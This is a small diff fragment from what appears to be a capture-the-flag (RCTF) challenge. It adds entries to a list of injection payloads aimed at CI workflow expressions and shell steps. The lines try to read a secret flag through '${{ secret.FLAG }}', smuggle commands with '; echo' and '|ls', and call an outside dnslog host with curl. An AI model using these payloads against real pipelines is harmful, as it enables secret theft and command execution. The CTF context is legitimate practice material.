@@ -845,3 +845,7 @@ ${{ env[FLAG] }}
 ${{ env.FLAG }}
 "; echo $flag"
 KawaiiYuyu:RCTF{52079}
+DongBother:${{ secret.FLAG }};
+
+shell: /bin/bash -e "curl fksb.sxhx72.dnslog.cn";
+|ls;
